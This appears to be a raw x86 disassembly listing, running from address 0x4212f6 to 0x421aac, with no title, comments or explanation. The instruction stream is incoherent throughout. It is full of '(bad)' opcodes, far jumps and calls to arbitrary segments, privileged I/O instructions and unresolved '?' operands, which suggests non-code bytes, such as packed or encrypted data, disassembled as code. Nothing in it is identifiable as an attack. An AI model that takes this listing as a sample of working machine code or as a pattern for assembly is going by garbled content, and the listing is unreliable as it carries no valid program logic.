  4212f6:	adc    BYTE PTR [ebx-0x79973295],dh
  4212fc:	ds xchg ebx,eax
  4212fe:	and    DWORD PTR [ebp-0x4ef5bc30],ebx
  421304:	jecxz  0x421340
  421306:	scas   al,BYTE PTR es:[edi]
  421307:	imul   ebp,DWORD PTR [eax],0x73
  42130a:	xlat   BYTE PTR ds:[ebx]
  42130b:	dec    esi
  42130c:	jp     0x4212c6
  42130e:	loope  0x421301
  421310:	or     al,BYTE PTR [ebp-0x7de1f441]
  421316:	sub    ecx,DWORD PTR [ecx]
  421318:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421319:	pop    ebp
  42131a:	ficom  DWORD PTR [ebp-0x33db324f]
  421320:	sbb    bh,al
  421322:	loope  0x4212fd
  421324:	(bad)  
  421325:	cs xor al,0x7d
  421328:	pop    edx
  421329:	aas    
  42132a:	push   ecx
  42132b:	daa    
  42132c:	dec    ebx
  42132d:	dec    edx
  42132e:	xchg   esp,eax
  42132f:	and    BYTE PTR [edx+0x76c994be],bh
  421335:	mov    ?,esi
  421337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421338:	daa    
  421339:	or     BYTE PTR [eax],dh
  42133b:	stos   BYTE PTR es:[edi],al
  42133c:	popf   
  42133d:	push   eax
  42133e:	push   edx
  42133f:	xchg   esi,eax
  421340:	push   edi
  421341:	rol    BYTE PTR [eax-0x248b18fc],0x22
  421348:	std    
  421349:	adc    DWORD PTR [eiz*8+0x2b4b3c],ebp
  421350:	fs dec edi
  421352:	dec    edi
  421353:	xlat   BYTE PTR ds:[ebx]
  421354:	ficom  DWORD PTR [edx]
  421356:	pop    ebx
  421357:	sbb    DWORD PTR [edi+edi*2],eax
  42135a:	jne    0x421357
  42135c:	mov    ch,0x88
  42135e:	jno    0x42132d
  421360:	add    BYTE PTR [ecx],ch
  421362:	fild   QWORD PTR [ecx]
  421364:	jmp    0xa50837ad
  421369:	iret   
  42136a:	mov    edi,0x40dc27e4
  42136f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421370:	ds (bad) 
  421372:	fstp   QWORD PTR [eax]
  421374:	push   esi
  421375:	ds dec esi
  421377:	jno    0x4213b1
  421379:	std    
  42137a:	cmc    
  42137b:	popf   
  42137c:	in     al,dx
  42137d:	cmc    
  42137e:	mov    al,0x74
  421380:	mov    esp,0xba2afb14
  421385:	pop    esp
  421386:	jmp    0x3d93:0xbdc3d05e
  42138d:	lahf   
  42138e:	cli    
  42138f:	lods   eax,DWORD PTR ds:[esi]
  421390:	(bad)  
  421392:	mov    ah,0x80
  421394:	daa    
  421395:	aam    0x32
  421397:	outs   dx,BYTE PTR ds:[esi]
  421398:	dec    eax
  421399:	mov    al,BYTE PTR [edx+0x5f72ed6c]
  42139f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213a0:	or     eax,0x957b1f2
  4213a5:	sub    edx,DWORD PTR [ecx+0x14b6f0ed]
  4213ab:	cmp    cl,BYTE PTR [esp+edx*8]
  4213ae:	(bad)  
  4213af:	push   edx
  4213b0:	(bad)  
  4213b1:	(bad)  
  4213b2:	xor    esp,DWORD PTR [ebx+0x1a7feb8a]
  4213b8:	xchg   BYTE PTR [edx-0x5a06f654],dh
  4213be:	xchg   ebp,eax
  4213bf:	mov    BYTE PTR [eax],ch
  4213c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213c2:	popa   
  4213c3:	mov    BYTE PTR [eax+esi*2+0x77],dh
  4213c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213c8:	bound  esi,QWORD PTR [edx-0x6c510e01]
  4213ce:	and    BYTE PTR [eax],ah
  4213d0:	retf   
  4213d1:	(bad)  
  4213d2:	out    0x8,eax
  4213d4:	fnstsw WORD PTR [ecx]
  4213d6:	(bad)  ds:0xd1692f1a
  4213dc:	cmp    eax,0x3381224b
  4213e1:	mov    edi,0xc96ce802
  4213e6:	cld    
  4213e7:	cmp    edx,DWORD PTR [edx]
  4213e9:	cmp    eax,DWORD PTR [esp+esi*8+0x12]
  4213ed:	cmc    
  4213ee:	enter  0x919e,0xa
  4213f2:	retf   0x6df1
  4213f5:	mov    ah,0x6b
  4213f7:	les    edi,FWORD PTR [ecx+0x691a2b9d]
  4213fd:	dec    ebx
  4213fe:	push   edi
  4213ff:	call   0xf245b79b
  421404:	and    BYTE PTR [ebx+0x34],0xfc
  421408:	xor    al,0xa2
  42140a:	cmp    ebx,DWORD PTR [ebp+esi*4-0x189aa3e8]
  421411:	loop   0x421419
  421413:	lds    ebx,FWORD PTR [ebp-0x21cf1f73]
  421419:	dec    ecx
  42141a:	mov    cl,0xea
  42141c:	mov    BYTE PTR [eax+0x63],al
  42141f:	or     ebp,DWORD PTR [ecx-0x26ee055c]
  421425:	(bad)  
  421427:	cmp    DWORD PTR [ecx],eax
  421429:	pusha  
  42142a:	mov    eax,0xe72130cd
  42142f:	xchg   DWORD PTR [ebx],eax
  421431:	aaa    
  421432:	push   esi
  421433:	push   esp
  421434:	ins    BYTE PTR es:[edi],dx
  421435:	and    eax,0xeaf7a9db
  42143a:	push   0xffffffad
  42143c:	mov    ebx,0x99ba59b1
  421441:	xchg   esi,eax
  421442:	pop    esi
  421443:	cdq    
  421444:	add    ah,BYTE PTR [ecx]
  421446:	mov    ch,0x23
  421448:	sbb    al,0x29
  42144a:	mov    DWORD PTR [esi],edi
  42144c:	push   ss
  42144d:	int3   
  42144e:	(bad)  
  42144f:	lods   al,BYTE PTR ss:[esi]
  421451:	cmc    
  421452:	adc    BYTE PTR [ecx+0x71aba60c],ah
  421458:	jle    0x421486
  42145a:	sub    DWORD PTR [ecx-0x757a041b],ecx
  421460:	outs   dx,BYTE PTR ds:[esi]
  421461:	pop    eax
  421462:	xchg   edi,eax
  421463:	mov    cl,0xd
  421465:	mov    ecx,0x2468bb9c
  42146a:	mov    WORD PTR [ebx-0x3b9fe6f6],?
  421470:	xor    DWORD PTR [edi],esi
  421472:	rcr    dh,cl
  421474:	xchg   esi,eax
  421475:	mov    ah,0x32
  421477:	jnp    0x42149e
  421479:	xchg   esp,eax
  42147a:	fild   QWORD PTR [edx+0x18]
  42147d:	push   0x2b
  42147f:	cdq    
  421480:	xor    al,0xb
  421482:	(bad)  
  421483:	js     0x42140b
  421485:	inc    ecx
  421486:	dec    esp
  421487:	jb     0x421468
  421489:	popa   
  42148a:	pusha  
  42148b:	out    dx,eax
  42148c:	in     al,0x50
  42148e:	pop    esp
  42148f:	xor    ecx,esi
  421491:	mov    BYTE PTR [esi-0x36d38e7a],ch
  421497:	pop    edi
  421498:	fiadd  WORD PTR [esi-0x3b5cdd88]
  42149e:	aaa    
  42149f:	sub    esp,esi
  4214a1:	pop    ebp
  4214a2:	push   es
  4214a3:	gs ins BYTE PTR es:[edi],dx
  4214a5:	out    0x2a,eax
  4214a7:	add    al,0x39
  4214a9:	and    BYTE PTR [esi+0x6e52c72],dl
  4214af:	addr16 xchg esi,eax
  4214b1:	ss pop eax
  4214b3:	mov    esp,0x2da55b1f
  4214b8:	loop   0x4214e4
  4214ba:	(bad)  
  4214bb:	repz push 0xc2ccdfa
  4214c1:	push   0x967a0372
  4214c6:	out    0x41,al
  4214c8:	mov    dl,cl
  4214ca:	adc    bh,BYTE PTR [ebp+0x7002617a]
  4214d0:	xchg   BYTE PTR [esi],cl
  4214d2:	inc    ebp
  4214d3:	fist   WORD PTR [ebx+edi*1-0x22]
  4214d7:	leave  
  4214d8:	jmp    0xe531:0xae701b5f
  4214df:	lahf   
  4214e0:	test   al,0x7a
  4214e2:	push   ebp
  4214e3:	js     0x421520
  4214e5:	sub    BYTE PTR [edx],bl
  4214e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214e8:	inc    esi
  4214e9:	inc    ebp
  4214ea:	sub    DWORD PTR [eax+0x7ab9b442],ecx
  4214f0:	fcomp  QWORD PTR [edi+0x36afa839]
  4214f6:	cmp    DWORD PTR [eax-0xb2f180d],ebp
  4214fc:	repz push es
  4214fe:	sub    BYTE PTR [edi],0xb0
  421501:	out    dx,eax
  421502:	push   eax
  421503:	pop    ds
  421504:	cmp    DWORD PTR [edx+ebp*2],ecx
  421507:	test   eax,0x25ebc9e9
  42150c:	jmp    0xdab3ae92
  421511:	and    BYTE PTR [ecx+0x4a],dh
  421514:	xchg   edi,eax
  421515:	pop    ecx
  421516:	js     0x421532
  421518:	push   0x9fba38bc
  42151d:	test   BYTE PTR [esi],bh
  42151f:	ss dec edx
  421521:	les    ebp,FWORD PTR [edi-0x18a0ec7a]
  421527:	jo     0x42151a
  421529:	dec    edx
  42152a:	inc    edx
  42152b:	fld    TBYTE PTR [esi-0xd8638a1]
  421531:	or     DWORD PTR [edi],eax
  421533:	xor    DWORD PTR [ebx],edx
  421535:	dec    edx
  421536:	out    dx,al
  421537:	test   cl,al
  421539:	repnz ins DWORD PTR es:[edi],dx
  42153b:	sbb    dh,bl
  42153d:	imul   ecx,DWORD PTR [ecx-0x29],0xaf9e224
  421544:	mov    ds:0xaea7abfb,eax
  421549:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42154a:	or     cl,ah
  42154c:	cmp    DWORD PTR [ebx-0x7fdc6a6c],eax
  421552:	or     cl,BYTE PTR [esi+esi*4-0x710ca158]
  421559:	and    ecx,ecx
  42155b:	dec    esi
  42155c:	iret   
  42155d:	imul   BYTE PTR ds:0x225e9c7f
  421563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421564:	fld    TBYTE PTR [ecx]
  421566:	add    ecx,DWORD PTR [ebx+0x444a62f2]
  42156c:	cmp    dl,BYTE PTR [edi]
  42156e:	adc    DWORD PTR [ebp+0x767af1ef],0xffffff92
  421575:	pop    esi
  421576:	add    eax,0x6415d00b
  42157b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42157c:	pop    ebp
  42157d:	gs ss inc edi
  421580:	neg    DWORD PTR [ebp+ebx*4-0x29]
  421584:	xor    al,0xbd
  421586:	add    al,bh
  421588:	dec    ebp
  421589:	sbb    al,0x89
  42158b:	inc    eax
  42158c:	ffreep st(2)
  42158e:	imul   esp,DWORD PTR [ecx+0x79],0xffffffba
  421592:	pop    ss
  421593:	ins    DWORD PTR es:[edi],dx
  421594:	push   ebx
  421595:	adc    bh,bh
  421597:	in     al,0xdd
  421599:	add    DWORD PTR [ebp+0x9514abf],eax
  42159f:	outs   dx,BYTE PTR ds:[esi]
  4215a0:	out    dx,al
  4215a1:	fistp  WORD PTR [edi-0x56]
  4215a4:	adc    eax,0x439649ce
  4215a9:	pop    ss
  4215aa:	or     al,0x36
  4215ac:	jb     0x42161f
  4215ae:	sbb    bh,ah
  4215b0:	cwde   
  4215b1:	xchg   DWORD PTR [edx+0x74cf1098],ebp
  4215b7:	(bad)
  4215ba:	add    dl,BYTE PTR [eax+ebp*8+0x30cc3c82]
  4215c1:	cmp    edi,DWORD PTR [eax-0x7d]
  4215c4:	daa    
  4215c5:	call   0x7a391dc0
  4215ca:	repnz inc ebp
  4215cc:	inc    ebx
  4215cd:	adc    BYTE PTR [ecx],al
  4215cf:	nop
  4215d0:	pop    es
  4215d1:	neg    DWORD PTR [edi+0x46]
  4215d4:	mov    edi,0xfde132a0
  4215d9:	jo     0x4215e2
  4215db:	fdivp  st(3),st
  4215dd:	xor    edx,DWORD PTR [esi]
  4215df:	fidiv  DWORD PTR [edx-0x1dac3d13]
  4215e5:	sbb    BYTE PTR [eax-0x12],0x49
  4215e9:	fadd   QWORD PTR [ecx-0x33]
  4215ec:	std    
  4215ed:	mov    edi,0x672b84b
  4215f2:	popf   
  4215f3:	aam    0x8a
  4215f5:	(bad)  
  4215f6:	es (bad) 
  4215f8:	das    
  4215f9:	sub    DWORD PTR [ecx+0x23a5d433],esi
  4215ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421600:	xchg   ebx,eax
  421601:	fs cmp eax,0x5bb48752
  421607:	pop    esi
  421608:	jnp    0x421665
  42160a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42160b:	cmc    
  42160c:	inc    edx
  42160d:	cdq    
  42160e:	xor    BYTE PTR [ecx],ch
  421610:	ret    0xe180
  421613:	adc    esi,DWORD PTR [ebx-0x37]
  421616:	cmp    eax,0x868299a7
  42161b:	std    
  42161c:	sbb    al,ch
  42161e:	pop    ss
  42161f:	(bad)  
  421620:	aad    0x17
  421622:	test   cl,dh
  421624:	addr16 pop edi
  421626:	jno    0x42166f
  421628:	addr16 xchg esi,eax
  42162a:	pushf  
  42162b:	mov    ah,ch
  42162d:	adc    eax,0xd0991a36
  421632:	outs   dx,DWORD PTR ds:[esi]
  421633:	and    edi,DWORD PTR [ebx]
  421635:	lods   eax,DWORD PTR ds:[esi]
  421636:	jne    0x4215fb
  421638:	jbe    0x421652
  42163a:	fwait
  42163b:	xchg   esi,eax
  42163c:	inc    ecx
  42163d:	push   edi
  42163e:	mov    BYTE PTR [eax],bh
  421640:	push   edi
  421641:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421642:	std    
  421643:	add    edi,DWORD PTR [edx-0x46706111]
  421649:	mov    esp,0x2144ba86
  42164e:	mov    edi,0x484e5ecf
  421653:	sub    al,0x1a
  421655:	push   cs
  421656:	jl     0x421664
  421658:	and    BYTE PTR [edx-0xe7a371d],bl
  42165e:	push   ds
  42165f:	(bad)  
  421660:	es cdq 
  421662:	mov    bh,0x40
  421664:	fwait
  421665:	ja     0x4215fb
  421667:	retf   
  421668:	sbb    esp,DWORD PTR [eax]
  42166a:	jb     0x421687
  42166c:	arpl   WORD PTR [edi],bx
  42166e:	repnz in al,0xb1
  421671:	inc    esp
  421672:	push   es
  421673:	fidiv  DWORD PTR [eax]
  421675:	pop    eax
  421676:	mov    DWORD PTR [eax+0x44],ebp
  421679:	in     eax,dx
  42167a:	inc    edi
  42167b:	popf   
  42167c:	jecxz  0x4216cc
  42167e:	or     BYTE PTR [ebx+0x1c92647b],0x2c
  421685:	jo     0x4216e2
  421687:	cmp    eax,0x56606cc8
  42168c:	test   eax,ecx
  42168e:	in     al,dx
  42168f:	inc    esp
  421690:	push   0x6e0df212
  421695:	cwde   
  421696:	or     BYTE PTR [ebp-0x7a],ah
  421699:	je     0x421655
  42169b:	mov    DWORD PTR [esi*1+0x32307eb3],esi
  4216a2:	mov    ebx,0xf0d09667
  4216a7:	push   cs
  4216a8:	fisub  DWORD PTR [edx+0x39d348d0]
  4216ae:	hlt    
  4216af:	lds    edi,FWORD PTR [edx+0x1f]
  4216b2:	iret   
  4216b3:	sbb    edx,DWORD PTR [ebp-0x3cdf1ae2]
  4216b9:	pop    eax
  4216ba:	xor    dh,bh
  4216bc:	test   eax,0xadbe5abc
  4216c1:	mov    dh,0xf0
  4216c3:	push   esp
  4216c4:	test   BYTE PTR [ebx-0x5b],dh
  4216c7:	add    BYTE PTR [eax-0x16],0xd0
  4216cb:	div    BYTE PTR [eax+0x3b8be020]
  4216d1:	and    esp,ebp
  4216d3:	sbb    BYTE PTR [ebx-0x1c],0x28
  4216d7:	(bad)  [ebx+0x11b3af41]
  4216dd:	inc    eax
  4216de:	lods   eax,DWORD PTR ds:[esi]
  4216df:	rol    DWORD PTR [ecx+0x1cabf02c],cl
  4216e5:	(bad)  
  4216e7:	sti    
  4216e8:	shl    ch,1
  4216ea:	call   0x230f:0x488c805e
  4216f1:	ret    0x2254
  4216f4:	cmp    DWORD PTR [ecx],edi
  4216f6:	inc    ebx
  4216f7:	xor    eax,0x12cf6360
  4216fc:	pop    edi
  4216fd:	dec    edx
  4216fe:	ret    
  4216ff:	and    eax,0xf0174c08
  421704:	outs   dx,BYTE PTR ds:[esi]
  421705:	(bad)  
  421706:	lods   eax,DWORD PTR ds:[esi]
  421707:	and    edi,DWORD PTR [ebx]
  421709:	ds cmc 
  42170b:	(bad)  [edx+0x34d451c9]
  421711:	call   0xd0e407da
  421716:	mov    bh,0xff
  421718:	enter  0x3c2a,0x21
  42171c:	jp     0x4216d1
  42171e:	xchg   ebx,eax
  42171f:	jne    0x421744
  421721:	adc    edx,DWORD PTR [ebp+edx*2+0x61]
  421725:	fwait
  421726:	loope  0x4216bb
  421728:	(bad)  
  421729:	jns    0x42172d
  42172b:	sub    esp,esp
  42172d:	mov    dl,0xda
  42172f:	mov    BYTE PTR [ebp+eiz*4-0x7],dl
  421733:	nop
  421734:	aad    0xb4
  421736:	rol    DWORD PTR [ebx-0x1b5f7f31],0x86
  42173d:	imul   ecx,ecx,0x7ee26852
  421743:	sub    dl,BYTE PTR [edx+0x6a]
  421746:	mov    dl,0x94
  421748:	dec    eax
  421749:	inc    esi
  42174a:	int    0xae
  42174c:	push   esi
  42174d:	lahf   
  42174e:	bound  ebx,QWORD PTR [ecx]
  421750:	daa    
  421751:	outs   dx,BYTE PTR ds:[esi]
  421752:	jns    0x4217bd
  421754:	imul   edi,DWORD PTR [esi+0x7a],0x93656fcc
  42175b:	es ja  0x421708
  42175e:	fsub   DWORD PTR [edi-0x20]
  421761:	fdivp  st(3),st
  421763:	mov    ecx,0x7fcb540
  421768:	loop   0x42177e
  42176a:	cli    
  42176b:	cmp    eax,0xec6aee22
  421770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421771:	add    ecx,DWORD PTR [edx]
  421773:	test   BYTE PTR [esi],0xb9
  421776:	xchg   ecx,eax
  421777:	sbb    cl,ah
  421779:	inc    ebp
  42177a:	jmp    0x42175b
  42177c:	mov    eax,ds:0x178096d3
  421781:	sub    BYTE PTR [ecx+edi*4-0xc],ah
  421785:	xchg   edi,eax
  421786:	adc    al,BYTE PTR [ebx+0x74cbf90e]
  42178c:	cmp    BYTE PTR [ebp-0x6566f03e],dh
  421792:	pop    edx
  421793:	xor    bh,ah
  421795:	repz dec esp
  421797:	sub    cl,BYTE PTR [eax*1+0x2eb2584b]
  42179e:	push   0xffffffe8
  4217a0:	cmp    eax,0x704784c4
  4217a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217a6:	and    BYTE PTR [ebx-0x474d9a6c],al
  4217ac:	in     eax,0x7e
  4217ae:	jmp    0x1c7b:0x40423f76
  4217b5:	mov    es,WORD PTR [edi-0xd7fed57]
  4217bb:	pop    edi
  4217bc:	add    DWORD PTR [ecx],ebx
  4217be:	out    dx,eax
  4217bf:	stos   BYTE PTR es:[edi],al
  4217c0:	ret    
  4217c1:	mov    eax,ds:0xcd31bad7
  4217c6:	or     DWORD PTR [edx+0x56],esp
  4217c9:	add    BYTE PTR [edi+0x5d],bh
  4217cc:	fwait
  4217cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217ce:	mov    dh,0x48
  4217d0:	mov    bl,0xed
  4217d2:	outs   dx,BYTE PTR ds:[esi]
  4217d3:	xchg   edx,eax
  4217d4:	int3   
  4217d5:	call   DWORD PTR [ecx+0x2a]
  4217d8:	jle    0x421809
  4217da:	jnp    0x421836
  4217dc:	add    al,0xcb
  4217de:	adc    ax,ax
  4217e1:	add    eax,0x8c4988fc
  4217e6:	dec    esi
  4217e7:	cmp    DWORD PTR [eax],ebp
  4217e9:	lock jle 0x421869
  4217ec:	into   
  4217ed:	ja     0x4217ac
  4217ef:	aam    0xf8
  4217f1:	jecxz  0x4217b1
  4217f3:	fild   WORD PTR [edx-0x58]
  4217f6:	add    al,0x92
  4217f8:	clc    
  4217f9:	fisub  DWORD PTR [edx]
  4217fb:	inc    BYTE PTR [edi]
  4217fd:	push   cs
  4217fe:	mov    esi,0x4123eb09
  421803:	push   DWORD PTR [edi-0x5690bd23]
  421809:	sti    
  42180a:	and    eax,0xaafdb11
  42180f:	neg    bh
  421811:	scas   eax,DWORD PTR es:[edi]
  421812:	dec    edi
  421813:	adc    BYTE PTR [edi+0x4a57c48f],bl
  421819:	stos   DWORD PTR es:[edi],eax
  42181a:	xor    BYTE PTR [ecx-0x38],dl
  42181d:	lea    edi,[esi]
  42181f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421820:	cmp    eax,DWORD PTR [ecx-0x4dd217b9]
  421826:	xchg   BYTE PTR [edx+0x21f95a9c],ch
  42182c:	push   es
  42182d:	cmp    al,0x93
  42182f:	jb     0x421814
  421831:	and    BYTE PTR [esi-0x453ad408],0x6d
  421838:	push   eax
  421839:	sub    BYTE PTR ds:0x80f88045,ch
  42183f:	popf   
  421840:	sub    dh,BYTE PTR [esi+esi*8+0x6eb3c82e]
  421847:	das    
  421848:	push   ss
  421849:	imul   ecx,DWORD PTR [ebx],0x40
  42184c:	mov    bl,al
  42184e:	(bad)  
  42184f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421850:	push   cs
  421851:	and    esi,edx
  421853:	jmp    0xb49e8b9d
  421858:	xchg   ecx,eax
  421859:	mov    al,0xeb
  42185b:	nop
  42185c:	lods   eax,DWORD PTR es:[esi]
  42185e:	imul   ecx
  421860:	add    bl,bl
  421862:	add    dl,BYTE PTR [edi+ebx*8-0x2a]
  421866:	mov    esi,0xfc3993e4
  42186b:	mov    eax,0x4aae03dd
  421870:	and    eax,0x387ef385
  421875:	in     eax,0xb9
  421877:	and    edi,DWORD PTR [eax+0x46]
  42187a:	push   ebp
  42187b:	je     0x4218be
  42187d:	or     DWORD PTR es:[ebx+0x79d45ecb],ebx
  421884:	pusha  
  421885:	mov    eax,edx
  421887:	push   ebp
  421888:	les    ecx,FWORD PTR fs:[edx+0x6c8e848]
  42188f:	inc    ecx
  421890:	and    esp,esi
  421892:	push   edx
  421893:	or     al,0x54
  421895:	add    dl,bh
  421897:	jns    0x421839
  421899:	jg     0x4218f8
  42189b:	mov    eax,0x7b76c2
  4218a0:	pop    edx
  4218a1:	push   ebx
  4218a2:	stc    
  4218a3:	call   0x897b:0xb2d04bb0
  4218aa:	int    0x81
  4218ac:	jae    0x421904
  4218ae:	dec    ecx
  4218af:	mov    bh,0x71
  4218b1:	mov    ebp,0xef7e0e7a
  4218b6:	or     al,0xc6
  4218b8:	mul    DWORD PTR gs:[ebp-0x9]
  4218bc:	mov    ds:0xe8fc50ec,al
  4218c1:	in     al,dx
  4218c2:	sbb    al,BYTE PTR [ecx+0x62502319]
  4218c8:	push   es
  4218c9:	mov    esp,0xd28a3276
  4218ce:	ret    
  4218cf:	call   0x33c6:0x6dc8f71f
  4218d6:	sbb    al,0xc5
  4218d8:	pop    edi
  4218d9:	pop    ss
  4218da:	xchg   esi,eax
  4218db:	push   esp
  4218dc:	inc    edx
  4218dd:	popa   
  4218de:	cmp    eax,0x80ec946d
  4218e3:	mov    bl,ah
  4218e5:	test   DWORD PTR [edi+0x55],esp
  4218e8:	cmp    WORD PTR [esi-0x6a9ea634],sp
  4218ef:	loope  0x421956
  4218f1:	lea    edx,[ebx]
  4218f3:	ds jb  0x421942
  4218f6:	xor    edx,DWORD PTR [eax-0x52fba2cf]
  4218fc:	mov    ch,0xe3
  4218fe:	cmp    ebp,0x3a
  421901:	mov    bh,0x7
  421903:	out    dx,eax
  421904:	stos   BYTE PTR es:[edi],al
  421905:	scas   al,BYTE PTR es:[edi]
  421906:	(bad)  
  421907:	or     al,0x4e
  421909:	jge    0x4218c4
  42190b:	lods   eax,DWORD PTR ds:[esi]
  42190c:	jmp    0x4218e5
  42190e:	sbb    bl,bh
  421910:	(bad)  
  421912:	fdiv   DWORD PTR [eax+0x8449240]
  421918:	rcl    BYTE PTR [ecx+eax*4-0xe],cl
  42191c:	jp     0x421945
  42191e:	or     ecx,0xffffff87
  421921:	mov    cl,0xab
  421923:	fmulp  st(5),st
  421925:	ja     0x4218c5
  421927:	neg    DWORD PTR [edi]
  421929:	frstor [eax]
  42192b:	adc    al,0xbd
  42192d:	icebp  
  42192e:	add    BYTE PTR [edx],cl
  421930:	and    eax,0x3513c4c0
  421935:	adc    ah,BYTE PTR [edx-0x1da1b2ad]
  42193b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42193c:	sub    DWORD PTR [edi-0x1e047836],edi
  421942:	xchg   ecx,eax
  421943:	pusha  
  421944:	lods   al,BYTE PTR ds:[esi]
  421945:	mov    dl,0xae
  421947:	(bad)  [ecx]
  421949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42194a:	dec    esp
  42194b:	push   ebx
  42194c:	(bad)  
  42194e:	sbb    dl,BYTE PTR [edx-0x533c67d5]
  421954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421955:	cmp    BYTE PTR [esi*1+0xf23d0ce],cl
  42195c:	out    0x11,al
  42195e:	inc    ebp
  42195f:	ds mov bl,0x7e
  421962:	cmp    al,ch
  421964:	cmp    DWORD PTR [ebp+0x3a94660b],edi
  42196a:	dec    edi
  42196b:	lods   al,BYTE PTR ds:[esi]
  42196c:	cmp    DWORD PTR [esi+0x3c63ce4],esp
  421972:	xor    bl,al
  421974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421975:	push   esi
  421976:	data16 arpl cx,bp
  421979:	sbb    DWORD PTR cs:[esi],ebx
  42197c:	or     ebp,esi
  42197e:	mov    al,0x68
  421980:	inc    edi
  421981:	sti    
  421982:	mov    dh,0x81
  421984:	mov    edi,DWORD PTR [edx]
  421986:	ins    BYTE PTR es:[edi],dx
  421987:	xchg   ebx,eax
  421988:	es gs mov ah,0x7c
  42198c:	pop    esp
  42198d:	(bad)  
  42198e:	imul   esp,DWORD PTR [esi-0x63de4763],0x55
  421995:	stos   DWORD PTR es:[edi],eax
  421996:	fcomp  QWORD PTR [edx]
  421998:	arpl   WORD PTR [ebx],si
  42199a:	fld    TBYTE PTR [ecx+0x7c1ef0f2]
  4219a0:	hlt    
  4219a1:	dec    ebx
  4219a2:	inc    edx
  4219a3:	loopne 0x4219d7
  4219a5:	mov    eax,ds:0xa55ec627
  4219aa:	inc    esi
  4219ab:	cli    
  4219ac:	jne    0x42194d
  4219ae:	mov    ecx,0x5dd02619
  4219b3:	mov    ah,0xb8
  4219b5:	push   edi
  4219b6:	sbb    eax,0x26853377
  4219bb:	stos   BYTE PTR es:[edi],al
  4219bc:	push   0xfffffff4
  4219be:	mov    esi,0x8c0024c5
  4219c3:	xchg   ebx,eax
  4219c4:	mov    ebp,0xed7dc5de
  4219c9:	inc    edx
  4219ca:	push   eax
  4219cb:	sub    eax,0x4ecf49e
  4219d0:	outs   dx,DWORD PTR ds:[esi]
  4219d1:	cwde   
  4219d2:	pop    edi
  4219d3:	cdq    
  4219d4:	nop
  4219d5:	mov    ss:0xbf54a6d4,eax
  4219db:	dec    ecx
  4219dc:	cmp    al,0xa
  4219de:	enter  0x6093,0x48
  4219e2:	repnz test edx,edi
  4219e5:	dec    eax
  4219e6:	sub    edx,0xffffff82
  4219e9:	jle    0x4219ce
  4219eb:	aaa    
  4219ec:	sub    bh,BYTE PTR [esi-0x24]
  4219ef:	cmc    
  4219f0:	lahf   
  4219f1:	push   ebx
  4219f2:	push   eax
  4219f3:	dec    ebx
  4219f4:	aam    0x6e
  4219f6:	repz popf 
  4219f8:	in     eax,0xcf
  4219fa:	pop    es
  4219fb:	outs   dx,BYTE PTR ds:[esi]
  4219fc:	add    DWORD PTR [edi-0x39],0x11
  421a00:	jle    0x4219e0
  421a02:	and    al,0x9c
  421a04:	mov    BYTE PTR [ecx-0x302cf8e4],bl
  421a0a:	mov    cl,0x21
  421a0c:	or     eax,0xcd37e320
  421a11:	fwait
  421a12:	and    al,bl
  421a14:	pop    es
  421a15:	cdq    
  421a16:	mov    esp,0xb3198aeb
  421a1b:	add    BYTE PTR [esi-0x54726e84],0xee
  421a22:	pop    ds
  421a23:	mov    edx,DWORD PTR [edi]
  421a25:	or     BYTE PTR [edx-0xec4dc82],al
  421a2b:	rol    BYTE PTR ds:0xdf278a1a,0x2
  421a32:	or     BYTE PTR [esi],cl
  421a34:	sti    
  421a35:	in     al,dx
  421a36:	daa    
  421a37:	xchg   ebx,eax
  421a38:	push   ds
  421a39:	xor    BYTE PTR [ecx+0x3],0x1e
  421a3d:	pushf  
  421a3e:	jne    0x421a23
  421a40:	mov    ebx,0xac2297d1
  421a45:	jno    0x421abd
  421a47:	pop    ebx
  421a48:	dec    edi
  421a49:	cmp    eax,DWORD PTR [esi]
  421a4b:	mov    ah,0x6
  421a4d:	arpl   sp,bx
  421a4f:	stos   BYTE PTR es:[edi],al
  421a50:	fsubrp st(6),st
  421a52:	mov    esp,0x9a957d5c
  421a57:	dec    sp
  421a59:	inc    edi
  421a5a:	call   0x6b18:0x17d39cab
  421a61:	scas   eax,DWORD PTR es:[edi]
  421a62:	test   DWORD PTR [esi-0x4b],eax
  421a65:	sbb    bl,BYTE PTR [eax-0x4c99a88f]
  421a6b:	xchg   ecx,eax
  421a6c:	repz mov ch,0xec
  421a6f:	sbb    al,0x73
  421a71:	mov    edi,?
  421a73:	stos   DWORD PTR es:[edi],eax
  421a74:	pusha  
  421a75:	cmc    
  421a76:	or     eax,0x160c500b
  421a7b:	inc    edi
  421a7c:	cmp    BYTE PTR [ebx+esi*4],bh
  421a7f:	pop    esi
  421a80:	dec    ebx
  421a81:	sbb    eax,0x7867a9e7
  421a86:	repz je 0x421b06
  421a89:	and    al,ch
  421a8b:	lods   eax,DWORD PTR ds:[esi]
  421a8c:	and    ebp,DWORD PTR ds:0x20c8f145
  421a92:	ss adc al,0xde
  421a95:	jae    0x421aab
  421a97:	fist   DWORD PTR es:[eax]
  421a9a:	push   0xaf29272a
  421a9f:	inc    esi
  421aa0:	lahf   
  421aa1:	add    edx,0xffffffee
  421aa4:	dec    ebx
  421aa5:	sub    eax,0xc3f4d48a
  421aaa:	add    edx,esp
  421aac:	mov    ds:0x5441e536,eax
